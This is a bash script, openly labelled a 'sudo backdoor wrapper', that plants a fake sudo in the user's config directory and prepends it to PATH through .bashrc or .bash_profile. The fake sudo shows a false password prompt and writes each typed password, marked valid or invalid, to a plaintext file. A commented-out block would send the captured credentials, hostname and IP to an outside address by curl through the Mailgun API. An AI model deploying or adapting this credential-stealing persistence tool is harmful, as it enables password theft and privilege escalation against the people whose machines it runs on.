#!/bin/bash

if [ ! -d ~/.config/sudo ]
then
    mkdir -p ~/.config/sudo
fi

if [ -f  ~/.config/sudo/sudo ]
then
    rm  ~/.config/sudo/sudo
fi

#bash sudo backdoor wrapper
echo '#!'$SHELL > ~/.config/sudo/sudo
cat <<'EOF' >> ~/.config/sudo/sudo
/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ]
then
    /usr/bin/sudo $@
else
    echo -n "[sudo] password for $USER: "
    read -s pwd
    echo
    echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
    if [ $? -eq 1 ]
    then
    echo "$USER:$pwd:invalid" >> ~/.config/sudo/sudo.config
    echo "Sorry, try again."
    sudo $@
    else
    echo "$USER:$pwd:valid" >> ~/.config/sudo/sudo.config
    # uncomment if using mailgun API
 #   sh ~/.config/sudo/m $USER $pwd &>>/dev/null &
    echo "$pwd" | /usr/bin/sudo -S true $@
    sudo $@
    fi
fi
EOF

# mailgun.com API for sending mails with valid creds (need create account)
#echo '#!'$SHELL > ~/.config/sudo/m
#cat <<'EOF' >> ~/.config/sudo/m
#ip1=`hostname -i`
#curl -s --user 'api:XXXXXX-XXXX-XXXX' \
#https://api.mailgun.net/v3/sandboxXXXXXXXXXX.mailgun.org/messages \
#-F from='CrEdLeAk <postmaster@sandboxXXXXXXXXXXXX.mailgun.org>' \
#-F to='Name <MAIL>' -F subject='Valid Cred from $HOSTNAME' -F text="$ip1:$HOSTNAME:$1:$2"
#EOF

chmod u+x ~/.config/sudo/sudo
if [ -f ~/.bashrc ]
then
    echo "export PATH=~/.config/sudo:$PATH" >> ~/.bashrc
else
    echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile
fi
